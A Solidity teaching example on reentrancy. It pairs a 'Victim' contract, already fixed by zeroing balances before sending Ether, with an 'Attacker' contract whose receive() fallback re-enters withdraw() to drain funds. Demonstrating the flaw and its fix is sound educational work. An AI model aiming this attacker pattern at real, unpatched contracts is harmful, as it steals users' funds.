// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Victim {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");
        // We can assign zero for balances of the caller to prevent this attack in a simple way.
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attacker {
    Victim public victim;

    constructor(address _etherStoreAddress) {
        victim = Victim(_etherStoreAddress);
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance >= msg.value) {
            victim.withdraw();
        }
    }
}


